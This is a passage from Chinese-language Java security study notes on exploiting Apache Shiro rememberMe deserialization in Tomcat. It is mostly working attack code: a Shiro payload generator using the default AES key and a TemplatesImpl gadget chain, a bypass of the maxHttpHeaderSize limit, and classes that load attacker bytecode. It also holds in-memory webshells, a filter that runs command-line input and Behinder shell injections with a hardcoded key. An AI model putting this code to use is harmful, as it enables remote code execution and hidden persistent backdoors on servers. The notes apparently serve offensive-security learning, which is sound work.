            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
            java.lang.reflect.Field headerSizeField = org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField("headerBufferSize");
            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler", null);
            contextField.setAccessible(true);
            headerSizeField.setAccessible(true);
            serviceField.setAccessible(true);
            requestField.setAccessible(true);
            getHandlerMethod.setAccessible(true);
            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());
            
            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);
            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();
            for (int i = 0; i < connectors.length; i++) {
                if (4 == connectors[i].getScheme().length()) {
                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {
                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();
                        for (int j = 0; j < classes.length; j++) {
                            // org.apache.coyote.AbstractProtocol$ConnectionHandler
                            if (52 == (classes[j].getName().length()) || 60 == (classes[j].getName().length())) {
                                java.lang.reflect.Field globalField = classes[j].getDeclaredField("global");
                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
                                globalField.setAccessible(true);
                                processorsField.setAccessible(true);
                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, null));
                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
                                for (int k = 0; k < list.size(); k++) {
                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));
                                    // 10000 为修改后的 headersize
                                    headerSizeField.set(tempRequest.getInputBuffer(), 10000);
                                }
                            }
                        }
                        // 10000 为修改后的 headersize
                        ((org.apache.coyote.http11.AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(10000);
                    }
                }
            }
        } catch (Exception e) {
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247484799&idx=1&sn=42e7807d6ea0d8917b45e8aa2e4dba44

修改过后，在拿回显打

![image-20220218134646737](img/image-20220218134646737.png)![image-20220218134646737](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220218134646737.png?lastModify=1646033842)

#### 将class bytes 使用gzip+base64压缩编码

https://zhuanlan.zhihu.com/p/395443877

==

#### 从 POST 请求体中发送字节码数据

通过反序列化一个类，让其执行静态代码块

PostEcho

```
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Response;
import org.apache.coyote.Request;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.List;
import java.util.Scanner;

public class PostEcho extends AbstractTranslet {
    static {
        try {
            Thread thread = Thread.currentThread();
            // 获取 group
            Field group = Class.forName("java.lang.Thread").getDeclaredField("group");
            group.setAccessible(true);
            ThreadGroup threadGroup  = (ThreadGroup) group.get(thread);

            // 获取 threads
            Field threads = Class.forName("java.lang.ThreadGroup").getDeclaredField("threads");
            threads.setAccessible(true);
            Thread[] thread1  = (Thread[]) threads.get(threadGroup);

            // 获取 target
            // 这里的数组位置并不是每次都一样，所以采取获取线程名称进行定位
            for (Thread thread2 : thread1){
                if(thread2.getName().contains("http-nio") && thread2.getName().contains("Poller")){
                    Field target = Class.forName("java.lang.Thread").getDeclaredField("target");
                    target.setAccessible(true);
                    Object o = target.get(thread2);

                    Field this$0 = o.getClass().getDeclaredField("this$0");
                    this$0.setAccessible(true);
                    Object o1 = this$0.get(o);

                    Field handler = Class.forName("org.apache.tomcat.util.net.AbstractEndpoint").getDeclaredField("handler");
                    handler.setAccessible(true);
                    Object o2 = handler.get(o1);

                    Field global = o2.getClass().getDeclaredField("global");
                    global.setAccessible(true);
                    RequestGroupInfo requestGroupInfo  = (RequestGroupInfo) global.get(o2);

                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    List<RequestInfo> list = (List<RequestInfo>) processors.get(requestGroupInfo);

                    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    req.setAccessible(true);
                    for (RequestInfo requestInfo : list){
                        Request request1 = (Request) req.get(requestInfo);
                        org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);
                        Response response2 = request2.getResponse();

                        System.out.println(request2.getParameter("c"));
                        byte[] bytes = Base64.getDecoder().decode(request2.getParameter("c"));
                        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
                        defineClass.setAccessible(true);
                        Class o3 = (Class) defineClass.invoke(PostEcho.class.getClassLoader(), new Object[]{bytes, new Integer(0), new Integer(bytes.length)});
                        o3.newInstance();
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

生成 rememberMe

```
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.catalina.tribes.group.interceptors.GzipInterceptor;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.Base64;
import java.util.PriorityQueue;
import java.util.zip.GZIPOutputStream;

import static org.apache.catalina.tribes.group.interceptors.GzipInterceptor.compress;

public class EchoPoc {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }


    public static void main(String[] args) throws Exception {
        // 获取默认类池
        ClassPool pool = ClassPool.getDefault();
//        CtClass ctClass = pool.get("shiro.Echo");
        CtClass ctClass = pool.get("shiro.PostEcho");
        byte[] code = ctClass.toBytecode();
//        byte[] code = GzipInterceptor.compress(ctClass.toBytecode());

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{code});
        setFieldValue(obj,"_name","test");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());

        BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator,"property","outputProperties");
        setFieldValue(queue,"queue",new Object[]{obj,1});

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);
        outputStream.writeObject(queue);
        outputStream.close();
        System.out.println(byteArrayOutputStream);

        // 将其转化为 shiro 攻击 payload
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource encrypt = aes.encrypt(byteArrayOutputStream.toByteArray(), key);
        System.out.println(encrypt.toString());

    }
}
```

Test.java:

Post传参：

执行：

```
javac8 Test.java
certutil -f -encode Test.class key
```

然后将生成的 base64 字符串 url 编码后放到 post 传参。

```
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Test extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

![image-20220218173538926](img/image-20220218173538926.png)![image-20220218173538926](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220218173538926.png?lastModify=1646033842)

（其实单纯执行命令来说，本来大小稍微优化下就不会超出，但植入内存马是就需要绕过限制了。）

## shiro植入内存马

之前的内存马是放到 jsp 里，然后去访问 jsp 动态注册的，这其实文件落地了，现在来实现下 反序列化 + 内存马。

```
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
    final String name = "KpLi0rn";
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if(req.getParameter("cmd") != null){
                    String osType = System.getProperty("os.name");
                    String[] cmd = null;
                    if (osType.toLowerCase().contains("win")){
                        cmd = new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
                    }else {
                        cmd = new String[]{"sh", "-c", req.getParameter("cmd")};
                    }
                    InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
                    Scanner scanner = new Scanner(in).useDelimiter("\\a");
                    String out = scanner.hasNext() ? scanner.next() : "";
                    servletResponse.getWriter().write(out);
                    servletResponse.getWriter().flush();
                    return;
                }
                // 放行
                filterChain.doFilter(servletRequest,servletResponse);
            }

            @Override
            public void destroy() {

            }

        };


        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        /**
         * 将filterDef添加到filterDefs中
         */
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/filter_shell");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name,filterConfig);
        out.print("Inject Success !");
    }
%>
```

request 为 jsp 内置对象，在配合反序列化命令执行时，我们得自己获取上边通过 request 得到的 context.

这里直接

```
WebappClassLoaderBase webappClassLoaderBase =
                     (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
             StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
```

完整代码：

```
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;
import java.util.Scanner;

public class FilterMa extends AbstractTranslet implements Filter{
    static {
        try {
            String name = "Evil";

            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Field Configs = null;
            Configs = standardContext.getClass().getDeclaredField("filterConfigs");

            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            FilterMa filter = new FilterMa();
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(filter.getClass().getName());
            /**
             * 将filterDef添加到filterDefs中
             */
            standardContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/filter_shell");
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());

            standardContext.addFilterMapBefore(filterMap);

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

            filterConfigs.put(name,filterConfig);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        if(req.getParameter("cmd") != null){
            String osType = System.getProperty("os.name");
            String[] cmd = null;
            if (osType.toLowerCase().contains("win")){
                cmd = new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
            }else {
                cmd = new String[]{"sh", "-c", req.getParameter("cmd")};
            }
            InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
            Scanner scanner = new Scanner(in).useDelimiter("\\a");
            String out = scanner.hasNext() ? scanner.next() : "";
            servletResponse.getWriter().write(out);
            servletResponse.getWriter().flush();
            return;
        }
        // 放行
        System.out.println("ok!!!!");
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

这里由于生成的 base64 编码过长，所以配合绕过 maxHttpHeaderSize。

上边绕过方法都可用。

```
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.catalina.tribes.group.interceptors.GzipInterceptor;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.Base64;
import java.util.PriorityQueue;
import java.util.zip.GZIPOutputStream;

import static org.apache.catalina.tribes.group.interceptors.GzipInterceptor.compress;

public class EchoPoc {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }


    public static void main(String[] args) throws Exception {
        // 获取默认类池
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("shiro.PostEcho");
        byte[] code = ctClass.toBytecode();
//        byte[] code = GzipInterceptor.compress(ctClass.toBytecode());

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{code});
        setFieldValue(obj,"_name","test");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());

        BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator,"property","outputProperties");
        setFieldValue(queue,"queue",new Object[]{obj,1});

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);
        outputStream.writeObject(queue);
        outputStream.close();
        System.out.println(byteArrayOutputStream);

        // 将其转化为 shiro 攻击 payload
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource encrypt = aes.encrypt(byteArrayOutputStream.toByteArray(), key);
        System.out.println(encrypt.toString());

    }
}
```



![image-20220218175922378](img/image-20220218175922378.png)![image-20220218175922378](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220218175922378.png?lastModify=1646033842)

## shiro注入冰蝎内存马

冰蝎的马

```
<%@page import="javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec" %>
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
%><%
    if (request.getMethod().equals("POST")) {
        String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
        session.putValue("u", k);
        Cipher c = Cipher.getInstance("AES");
        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    }
%>
```

冰蝎自定义了一个可以加载字节数组的加载器，可将字节数组转换为 Class 对象。

判断请求方法为 POST，读取请求体中的数据，拿到进行Base64+AES解码后的字节码数据。

然后 调用自定义类加载器**U**拿到class后，进行`newInstance`实例化，调用其恶意对象的`equals`方法，并且传入`pageContext`

这里 request 、session 和  pageContex 是 jsp 内置对象，所以这里需要自己构造。

在之前 半自动挖掘链时 很多方法可以做到。

在冰蝎的代码中，服务端需要从pageContext对象中获取出request/response/session。

而在冰蝎3.0  bata7之后不再依赖pageContext对象，只需给在equal函数中传递的object对象中，有request/response/session对象即可，所以此时我们可以把pageContext对象换成一个Map，手动添加这三个对象即可

```
//create pageContext
HashMap pageContext = new HashMap();
pageContext.put("request",request);
pageContext.put("response",response);
pageContext.put("session",session);
```

完整代码：

```
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

public class BehinderShell extends AbstractTranslet implements Filter{
    static {
        try {
            String name = "Evil";

            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Field Configs = null;
            Configs = standardContext.getClass().getDeclaredField("filterConfigs");

            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            BehinderShell filter = new BehinderShell();
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(filter.getClass().getName());
            /**
             * 将filterDef添加到filterDefs中
             */
            standardContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/filter_shell");
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());

            standardContext.addFilterMapBefore(filterMap);

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

            filterConfigs.put(name,filterConfig);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        class U extends ClassLoader {
            U(ClassLoader c) {
                super(c);
            }

            public Class g(byte[] b) {
                return super.defineClass(b, 0, b.length);
            }
        }

        try {

            Thread thread = Thread.currentThread();
            // 获取 group
            Field group = Class.forName("java.lang.Thread").getDeclaredField("group");
            group.setAccessible(true);
            ThreadGroup threadGroup  = (ThreadGroup) group.get(thread);

            // 获取 threads
            Field threads = Class.forName("java.lang.ThreadGroup").getDeclaredField("threads");
            threads.setAccessible(true);
            Thread[] thread1  = (Thread[]) threads.get(threadGroup);

            // 获取 target
            // 这里的数组位置并不是每次都一样，所以采取获取线程名称进行定位
            for (Thread thread2 : thread1){
                if(thread2.getName().contains("http-nio") && thread2.getName().contains("Poller")){
                    Field target = Class.forName("java.lang.Thread").getDeclaredField("target");
                    target.setAccessible(true);
                    Object o = target.get(thread2);

                    Field this$0 = o.getClass().getDeclaredField("this$0");
                    this$0.setAccessible(true);
                    Object o1 = this$0.get(o);

                    Field handler = Class.forName("org.apache.tomcat.util.net.AbstractEndpoint").getDeclaredField("handler");
                    handler.setAccessible(true);
                    Object o2 = handler.get(o1);

                    Field global = o2.getClass().getDeclaredField("global");
                    global.setAccessible(true);
                    RequestGroupInfo requestGroupInfo  = (RequestGroupInfo) global.get(o2);

                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    List<RequestInfo> list = (List<RequestInfo>) processors.get(requestGroupInfo);

                    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    req.setAccessible(true);
                    for (RequestInfo requestInfo : list){
                        org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo);
                        org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);

                        HttpSession session = request2.getSession();
                        Response response = request2.getResponse();
                        HashMap pageContext = new HashMap();
                        pageContext.put("request",request2);
                        pageContext.put("response",response);
                        pageContext.put("session",session);
                        if (request2.getMethod().equals("POST")) {
                            String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                            session.putValue("u", k);
                            Cipher c = Cipher.getInstance("AES");
                            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                            new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request2.getReader().readLine()))).newInstance().equals(pageContext);
                        }

                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        // 放行

        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

但是连接不上，

通过rememberMe发送给shiro后，就会发现冰蝎并连接不上。此错误在文章[冰蝎改造之不改动客户端=>内存马](https://mp.weixin.qq.com/s/r4cU84fASjflHrp-pE-ybg)中给出了思路，需要自己通过反射调用类加载器。直接给出代码

```
//revision BehinderFilter
Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
method.setAccessible(true);
byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length);
evilclass.newInstance().equals(pageContext);
```

完整代码：

```
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import sun.misc.BASE64Decoder;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

public class BehinderShell extends AbstractTranslet implements Filter{
    static {
        try {
            String name = "Evil";

            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Field Configs = null;
            Configs = standardContext.getClass().getDeclaredField("filterConfigs");

            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            BehinderShell filter = new BehinderShell();
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(filter.getClass().getName());
            /**
             * 将filterDef添加到filterDefs中
             */
            standardContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/filter_shell");
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());

            standardContext.addFilterMapBefore(filterMap);

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

            filterConfigs.put(name,filterConfig);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        class U extends ClassLoader {
            U(ClassLoader c) {
                super(c);
            }

            public Class g(byte[] b) {
                return super.defineClass(b, 0, b.length);
            }
        }

        try {
            HttpServletRequest request2 = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse) servletResponse;
            HttpSession session = request2.getSession();

            HashMap pageContext = new HashMap();
            pageContext.put("request", request2);
            pageContext.put("response", response);
            pageContext.put("session", session);
            if (request2.getMethod().equals("POST")) {
                String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                session.putValue("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                //revision BehinderFilter
                Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                method.setAccessible(true);
                byte[] evilclass_byte = c.doFinal(new BASE64Decoder().decodeBuffer(request2.getReader().readLine()));
                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                evilclass.newInstance().equals(pageContext);
            }
        }catch(Exception e){
            e.printStackTrace();
        }

        // 放行

        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```







![image-20220218204337439](img/image-20220218204337439.png)![image-20220218204337439](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220218204337439.png?lastModify=1646033842)

springboot + shiro 环境失败。

## shiro+springboot

修改 maxHttpHeaderSize 用上边的方法。

回显：

```
